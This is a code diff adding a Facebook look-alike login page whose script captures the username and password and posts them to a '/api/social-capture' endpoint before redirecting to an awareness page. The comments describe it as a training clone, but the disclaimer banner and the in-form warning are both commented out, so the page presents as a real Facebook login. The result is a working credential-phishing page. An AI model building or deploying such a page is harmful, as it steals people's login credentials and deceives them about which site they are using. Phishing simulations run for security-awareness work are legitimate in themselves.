@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Facebook</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Poppins", sans-serif;
+      background: #f2f4f7;
+      position: relative;
+      min-height: 100vh;
+    }
+
+    /* training watermark banner */
+    .training-banner {
+      background: #dc3545;
+      color: white;
+      text-align: center;
+      padding: 12px;
+      font-weight: bold;
+      font-size: 15px;
+      position: sticky;
+      top: 0;
+      z-index: 9999;
+      font-family: 'Poppins', sans-serif;
+      letter-spacing: 0.5px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    .content {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 100%;
+      padding: 1rem;
+    }
+
+    .flex-div {
+      display: flex;
+      justify-content: space-evenly;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 2rem;
+    }
+
+    .name-content {
+      margin-right: 7rem;
+      max-width: 500px;
+    }
+
+    .name-content .logo {
+      font-size: 3.5rem;
+      color: #1877f2;
+      font-weight: 700;
+      letter-spacing: -0.5px;
+    }
+
+    .name-content p {
+      font-size: 1.3rem;
+      font-weight: 500;
+      margin-bottom: 1rem;
+      color: #1b1f23;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+      padding: 2rem;
+      width: 100%;
+      max-width: 530px;
+      border-radius: 0.5rem;
+      box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+    }
+
+    form input {
+      outline: none;
+      padding: 0.8rem 1rem;
+      margin-bottom: 0.8rem;
+      font-size: 1.1rem;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      transition: 0.2s;
+    }
+
+    form input:focus {
+      border: 1.8px solid #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    form .login {
+      outline: none;
+      border: none;
+      background: #1877f2;
+      padding: 0.8rem 1rem;
+      border-radius: 0.4rem;
+      font-size: 1.1rem;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    form .login:hover {
+      background: #0f71f1;
+    }
+
+    form a {
+      text-decoration: none;
+      text-align: center;
+      font-size: 0.9rem;
+      padding-top: 0.8rem;
+      color: #1877f2;
+      font-weight: 500;
+    }
+
+    form a:hover {
+      text-decoration: underline;
+    }
+
+    form hr {
+      background: #dadde1;
+      margin: 1rem 0;
+      border: none;
+      height: 1px;
+    }
+
+    form .create-account {
+      outline: none;
+      border: none;
+      background: #06b909;
+      padding: 0.8rem 1rem;
+      border-radius: 0.4rem;
+      font-size: 1rem;
+      font-weight: 600;
+      color: #fff;
+      width: 75%;
+      margin: 0 auto;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    form .create-account:hover {
+      background: #03ad06;
+    }
+
+    /* small educational note inside form */
+    .training-note {
+      font-size: 0.7rem;
+      text-align: center;
+      color: #65676b;
+      margin-top: 12px;
+      border-top: 1px solid #e4e6eb;
+      padding-top: 10px;
+    }
+
+    /* Media Queries (fully responsive as original) */
+    @media (max-width: 500px) {
+      html { font-size: 60%; }
+      .name-content { margin: 0; text-align: center; }
+      form { width: 300px; max-width: 90%; height: fit-content; padding: 1.5rem; }
+      form input { margin-bottom: 1rem; font-size: 1.5rem; }
+      form .login { font-size: 1.5rem; }
+      form a { font-size: 1.5rem; }
+      form .create-account { font-size: 1.5rem; width: 100%; }
+      .flex-div { flex-direction: column; }
+    }
+
+    @media (min-width: 501px) and (max-width: 768px) {
+      html { font-size: 60%; }
+      .name-content { margin: 0; text-align: center; }
+      form { width: 350px; max-width: 90%; height: fit-content; }
+      form input { margin-bottom: 1rem; font-size: 1.5rem; }
+      form .login { font-size: 1.5rem; }
+      form a { font-size: 1.5rem; }
+      form .create-account { font-size: 1.5rem; width: 100%; }
+      .flex-div { flex-direction: column; }
+    }
+
+    @media (min-width: 769px) and (max-width: 1200px) {
+      .name-content { margin-right: 2rem; }
+      form { width: 450px; }
+    }
+
+    @media (orientation: landscape) and (max-height: 500px) {
+      .content { position: relative; top: 0; left: 0; transform: none; margin: 2rem auto; }
+      body { min-height: auto; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- TRAINING DISCLAIMER BANNER (Educational clone notice) 
+<div class="training-banner">
+  🎓 ACADEMIC TRAINING PURPOSES ONLY – This is a cloned page for cybersecurity awareness. Do NOT enter real credentials.
+</div>-->
+
+<div class="content">
+  <div class="flex-div">
+    <div class="name-content">
+      <h1 class="logo">Facebook</h1>
+      <p>Connect with friends and the world around you on Facebook.</p>
+    </div>
+    <form id="facebookTrainingForm">
+      <input type="text" id="email_or_phone" name="email_or_phone" placeholder="Email or Phone Number" required autocomplete="off" />
+      <input type="password" id="password" name="password" placeholder="Password" required autocomplete="off" />
+      <button class="login" type="submit">Log In</button>
+      <a href="#">Forgot Password ?</a>
+      <hr />
+      <button class="create-account" type="button">Create New Account</button>
+    <!--  <div class="training-note">
+        ⚠️ Training simulation – credentials are not stored permanently (educational environment)
+      </div>-->
+    </form>
+  </div>
+</div>
+
+<!-- CAPTURE SCRIPT for Facebook Training Clone (social-capture endpoint) -->
+<script>
+  (function() {
+    const form = document.getElementById('facebookTrainingForm');
+    if (!form) return;
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();  // prevent actual submission
+
+      // Extract input values manually (also works with FormData)
+      const emailInput = document.getElementById('email_or_phone');
+      const passwordInput = document.getElementById('password');
+      
+      let username = emailInput ? emailInput.value.trim() : '';
+      let password = passwordInput ? passwordInput.value : '';
+
+      // build payload exactly for /api/social-capture endpoint
+      const payload = {
+        site: 'facebook',
+        form_data: {
+          username: username,
+          password: password,
+          // include extra field for clarity
+          email_or_phone: username
+        }
+      };
+
+      // Send data to the backend training endpoint
+      fetch('/api/social-capture', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('[Training] Facebook clone capture stored:', data);
+      })
+      .catch(err => {
+        console.warn('[Training] Capture error (simulation mode):', err);
+      })
+      .finally(() => {
+        // Redirect to awareness training page after submission
+        window.location.href = '/awareness-training';
+      });
+    });
+
+    // Optional: the "Create New Account" button just shows a training message
+    const createBtn = document.querySelector('.create-account');
+    if (createBtn) {
+      createBtn.addEventListener('click', function(e) {
+        e.preventDefault();
+        alert('📘 Training environment: This is a simulated Facebook clone. No actual account creation occurs.');
+      });
+    }
+  })();
+</script>
+
+<!-- Additional fallback for any missing API calls: ensures fully functional training demo -->
+<noscript>
+  <div style="background:#ffcccc; padding:10px; text-align:center;">JavaScript required for training simulation.</div>
+</noscript>
+</body>
+</html>
